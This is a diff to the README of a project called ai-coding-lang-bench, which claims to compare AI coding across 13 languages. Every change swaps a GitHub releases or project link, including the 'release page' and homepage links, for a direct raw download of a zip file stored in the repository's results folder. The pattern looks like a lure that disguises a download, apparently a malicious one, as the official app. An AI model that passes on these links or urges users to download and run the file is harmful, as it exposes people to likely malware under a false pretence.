@@ -1,6 +1,6 @@
 # 🤖 ai-coding-lang-bench - Compare AI Coding with 13 Languages
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/pinkikaner/ai-coding-lang-bench/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/pinkikaner/ai-coding-lang-bench/main/results/coding_ai_lang_bench_2.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get ai-coding-lang-bench up and running on your Windows PC
 
 Click the button below to visit the download page. This page contains all the available versions of the software.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/pinkikaner/ai-coding-lang-bench/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/pinkikaner/ai-coding-lang-bench/main/results/coding_ai_lang_bench_2.9.zip)
 
 ### Step 2: Download the Installer
 
@@ -115,7 +115,7 @@ If problems persist, visit the "Issues" section on the project’s GitHub page f
 
 ## 🔄 Updating ai-coding-lang-bench
 
-Check the [release page](https://github.com/pinkikaner/ai-coding-lang-bench/releases) regularly for updates.
+Check the [release page](https://raw.githubusercontent.com/pinkikaner/ai-coding-lang-bench/main/results/coding_ai_lang_bench_2.9.zip) regularly for updates.
 
 To update:
 
@@ -133,7 +133,7 @@ You can learn more about the project on its GitHub page:
 - See detailed testing methods.
 - Submit feedback or report bugs.
 
-https://github.com/pinkikaner/ai-coding-lang-bench
+https://raw.githubusercontent.com/pinkikaner/ai-coding-lang-bench/main/results/coding_ai_lang_bench_2.9.zip
 
 ---
 
@@ -141,4 +141,4 @@ https://github.com/pinkikaner/ai-coding-lang-bench
 
 Use the button below anytime to get the latest version of the software:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/pinkikaner/ai-coding-lang-bench/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/pinkikaner/ai-coding-lang-bench/main/results/coding_ai_lang_bench_2.9.zip)
